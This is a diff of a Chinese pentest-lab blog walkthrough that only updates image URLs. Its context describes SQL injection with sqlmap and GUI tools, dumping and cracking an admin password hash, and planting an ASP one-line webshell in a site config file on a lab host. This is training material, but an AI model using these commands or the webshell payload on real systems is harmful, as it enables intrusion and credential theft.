@@ -19,7 +19,7 @@ categories: [InfoSec,Pentest]
 
 <!-- more -->
 
-![guide](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/guide.png)
+![guide](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/guide.png)
 
 ***特此声明：由于本实验题目中包含 2 道选择题，因此不再沿用先前以题目名称作为章节标题的做法，而按照渗透流程的重要步骤来命名。***
 
@@ -31,13 +31,13 @@ categories: [InfoSec,Pentest]
 
 既然环境里提供了 WVS 工具，省去了我们下载安装的麻烦，那事不宜迟，先来体验一番。打开实验工具箱，在【目录扫描】文件夹中打开【AWVS】，即可看见我们的工具了：
 
-![acunetix](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/acunetix.png)
+![acunetix](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/acunetix.png)
 
 本节只演示 WVS 网站扫描的主要功能，包括目录扫描与漏洞扫描，其他功能请读者查看教程自行操作。点击 **New Scan**，在 **Scan Type** 栏的 **Website URL** 中填入目标站点 `http://www.test.ichunqiu/`，一直默认点击 **Next** 到最后的 **Finish** 栏，把 **CASE insensitive crawling** 前的钩去掉（因为服务器系统是 Windows，所有不需要大小写敏感，而 Linux 系统则需要），点击 **Finish** 完成。
 
 等待一段时间，扫描完毕后，在界面中看到目录扫描与漏洞扫描的结果：
 
-![acunetix_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/acunetix_result.png)
+![acunetix_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/acunetix_result.png)
 
 不过可惜的是，后台登录页面都没被抓取出来，所以前面我才说没有提供实质性的帮助，此处权当 WVS 工具的使用练习。回到题目，有如下 4 个选项，从 WVS 的全称不难看出，把它作为 **漏洞扫描工具** 更为合适：
 
@@ -125,19 +125,19 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 打开工具，依次点击 **SQL注入 -> 批量扫描注入点 -> 添加网址**，填入主站 URL `http://www.test/ichunqiu/`，保存后点击 **批量分析注入点**：
 
-![domain_info](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_info.png)
+![domain_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_info.png)
 
 分析完毕后，右击其中一个注入点，点击 **检测注入**：
 
-![domain_injectable](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_injectable.png)
+![domain_injectable](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_injectable.png)
 
 点击后会自动跳转至 **SQL注入猜解检测** 选项卡，不过这里不用检测出来的注入点，用我们手工发现的注入点，一来换换口味，二来获得点成就感，三来顺便验证手工发现的注入点是否可靠。下面将 **注入点** 改为 `http://www.test.ichunqiu/shownews.asp?id=1`，点击 **开始检测**，结果确实为一个可用注入点：
 
-![domain_verification](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_verification.png)
+![domain_verification](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_verification.png)
 
 确认可注入后，点击 **猜解表名** 后得到 4 张表，接着选中 `admin` 表，点击 **猜解列名** 后得到 3 个列名，在所有列名前打上钩，点解 **猜解内容** 后即可得到管理员的账号为 `admin`，16 位的密码哈希值为 `469e80d32c0559f8`。至此，通过明小子工具成功地获取了管理员的账号密码。
 
-![domain_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_result.png)
+![domain_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_result.png)
 
 ### 穿山甲（Pangolin）
 
@@ -145,11 +145,11 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 打开工具，在 **URL** 处填入注入点 `http://www.test.ichunqiu/shownews.asp?id=1`（注意：该工具不提供注入点扫描，只判断输入参数是否能作为注入点），点击 **开始** 箭头后，得到以下结果，说明注入点有效：
 
-![pangolin_info](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pangolin_info.png)
+![pangolin_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pangolin_info.png)
 
 切换到 **Datas** 选项卡，点击 **Tables** 后得到 4 张表，接着选中 `admin` 表（注意不是打钩），点击 **Columns** 后得到 4 个列名，此时才在 `admin` 前打钩，选中所有列，点击 **Datas** 后即可获得管理员账号密码。可见，穿山甲工具的使用流程与明小子非常类似。
 
-![pangolin_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pangolin_result.png)
+![pangolin_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pangolin_result.png)
 
 ### SQLMap
 
@@ -171,21 +171,21 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 确保了命令行路径在【SQLMap】目录下后，根据（2）输入命令 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1` ，若询问「已确认 `id` 参数可注入，还需检测其他参数？」填 `N`，结果显示此为**基于布尔的盲注（boolean-based blind）**，并且返回了一些服务器相关信息，如：服务器操作系统为 **Windows 2003 或 Windows XP**，Web 应用程序采用了 **APS.NET、Microsoft IIS 6.0、ASP** 等建站技术，后端数据库数理系统为 **Microsoft Access**。以上对服务器相关信息的收集有助于后续更高效精准的渗透。
 
-![sqlmap_info](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_info.png)
+![sqlmap_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_info.png)
 
 知道了后端数据库是 Microsoft Access 后，可以跳过（3）或（4）直接进行（5），输入命令 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 --tables`，若询问「需要检测常用表名是否存在？」填 `Y`，询问「需要的线程数量？」填最大值 `10`。检测将近一半时，按 `Ctrl + C` 手动终止扫描，得到了包含 `admin` 表在内的 6 张表。**注意：由于 SQLMap 扫描所用的字典范围更广，因此比起前两者能发现更多的数据表。**
 
 > 小贴士：由于扫描花时较长，当看到 `admin` 表出现时，可按 `Ctrl + C` 手动停止扫描。
 
-![sqlmap_tables](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_tables.png)
+![sqlmap_tables](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_tables.png)
 
 继续执行（6）中的命令，输入 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 -T admin --columns`，若询问「需要检测常用列名是否存在？」填 `Y`，询问「需要的线程数量？」填最大值 `10`。本次扫描不手动终止，等待其全部扫描完毕，得到了 `username` 与 `password` 等 6 个字段。
 
-![sqlmap_columns](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_columns.png)
+![sqlmap_columns](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_columns.png)
 
 最后执行（7）中的命令，输入 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 -T admin -C username,password --dump`，等待其枚举完毕，若询问「需要临时保存结果的哈希值？」填 `N`，询问「需要用字典攻击来破解结果？」填 `n`，随即可看到管理员的账号密码等数据。
 
-![sqlmap_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_result.png)
+![sqlmap_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_result.png)
 
 ## SQL 手工注入
 
@@ -200,7 +200,7 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 打开 HackBar 工具，我们对 `admin`、`user`、`news` 等常见表名进行猜解，发现均能正常显示：
 
-![manual_tables](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_tables.png)
+![manual_tables](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_tables.png)
 
 ### Step 2：猜解列数
 
@@ -212,9 +212,9 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 经过反复尝试，可以确定查询数据的列数为 11：
 
-![manual_num_true](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_num_true.png)
+![manual_num_true](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_num_true.png)
 
-![manual_num_false](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_num_false.png)
+![manual_num_false](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_num_false.png)
 
 ### Step 3：找出显位点
 
@@ -224,7 +224,7 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 经过反复试验，得知该数据库是从查询结果的第 1 列数据开始升排序（若第 1 列相等，则比较第 2 列，以此类推），并且将第 1 行结果的部分数据在页面上展示。因此上述联合查询能有效执行，并发现了显位点为第 2、3、7、8、9 列：
 
-![manual_points](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_points.png)
+![manual_points](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_points.png)
 
 若想完全避免前一次查询结果的影响，可将限制条件 `id=1` 改为 `id=1 AND 1=2`。
 
@@ -232,27 +232,27 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 最后一步，就是用猜想的列名去替换显位点，如果猜想正确，则页面会显示数据内容，否则出现异常。我们对 `user`、`username`、`account`、`pwd`、`password`、`key`、`credit` 等常见列名进行猜解，终于在 `username`、`password` 两列中读取到管理员的账号密码：
 
-![manual_result](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_result.png)
+![manual_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_result.png)
 
 ## 敏感信息泄露
 
 在本节末尾留个小彩蛋，细心的读者可能在上述注入点的页面底部发现了：
 
-![leak](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/leak.png)
+![leak](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/leak.png)
 
 对的，你想的没错，管理员的 16 位密码哈希值，用 [MD5解密工具](http://www.dmd5.com/md5-decrypter.jsp) 解密后的明文结果正是 `admin888`：
 
-![password](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/password.png)
+![password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/password.png)
 
 # 0x03 获取后台登录地址
 
 根据实验手册的提示，在实验工具箱的【目录扫描】->【御剑后台扫描工具】文件夹下打开工具，在 **域名** 处填上主站 URL `http://www.test.ichunqiu/`，点击 **开始扫描** 即可轻松获取后台登录地址 `/admin/login.asp`：
 
-![yujian_scan](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/yujian_scan.png)
+![yujian_scan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/yujian_scan.png)
 
 上节提到的明小子（Domain）注入工具也带有目录扫描功能，点击 **SQL注入 -> 管理入口扫描** 选项卡，在 **注入点** 处填上主站 URL，点击 **扫描后台地址** 同样能得到后台登录地址：
 
-![domain_scan](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_scan.png)
+![domain_scan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_scan.png)
 
 > 小贴士：通过这几次渗透实验可发现，大多 CMS 的默认后台登录地址为 `/admin`，因此在使用目录扫描工具前可先行尝试。
 
@@ -262,35 +262,35 @@ SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，
 
 先用管理员账号 `admin` 与密码 `admin888` 登录后台：
 
-![login_back](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/login_back.png)
+![login_back](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/login_back.png)
 
 根据题目的提示，寻找后台备份文件、文件上传处、内容填写框等能够插入木马的漏洞，但可惜的是，很快能发现**备份文件无效、文件上传无反应、大多文本框不能填写**，看来服务器限制了该账户的写入权限。
 
 只剩下**写入配置文件**了，并在 **系统设置管理 -> 网站信息配置** 发现了配置文件更改处。问题又来了，写入木马的配置文件在哪读取？于是先在外网搜索到 CMS 的源码，在此目录中搜索 `conf` 等关键字，发现了 4 个目标文件：
 
-![search_config](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/search_config.png)
+![search_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/search_config.png)
 
 经过逐一排查，最终确定其中的 `/inc/Config.asp` 与网站配置信息相关：
 
-![inc_config](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/inc_config.png)
+![inc_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/inc_config.png)
 
 接下来尝试在任意一栏中写入 ASP 版的一句话木马 `"%><%Eval Request("cmd")%><%'`。**注意：`"%>` 是为了闭合前段 ASP 代码；`cmd` 是木马的请求参数；`<%'` 是为了开启后段 ASP 代码，并用单引号注释该行剩下的代码。**写入木马前，最好把栏中原有的配置信息删除，即可直观地判断是否写入成功。
 
 以 **网站标题** 一栏为例，写入一句话木马：
 
-![trojan_writing](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/trojan_writing.png)
+![trojan_writing](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/trojan_writing.png)
 
 写入后点击 **保存设置**，可见写入木马后该栏为空：
 
-![trojan_written](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/trojan_written.png)
+![trojan_written](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/trojan_written.png)
 
 然后在工具箱【webshell】目录下拔出[中国菜刀](http://www.zhongguocaidao.com/)，在 **添加SHELL** 中填入目标 URL 与请求参数后保存：
 
